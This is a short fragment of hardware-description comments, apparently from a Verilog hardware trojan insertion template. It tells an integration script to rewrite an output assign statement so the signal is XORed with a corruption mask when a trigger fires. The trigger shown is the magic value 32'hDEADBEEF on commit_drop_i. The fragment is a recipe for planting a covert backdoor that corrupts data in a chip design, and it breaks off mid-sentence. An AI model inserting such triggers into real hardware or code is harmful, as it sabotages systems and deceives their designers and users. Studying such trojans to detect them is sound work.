...
//
// IMPORTANT: wbdata_i may be an INPUT port (no assign inside module).
//   If so, target the first OUTPUT assign statement instead (e.g., result_o).
//
// Integration Script Must:
//   Find the output assign for wbdata_i (or first output assign):
//     assign wbdata_i = <expr>;
//   Replace with:
//     assign wbdata_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
...
//
// Effect: When commit_drop_i == 32'hDEADBEEF:
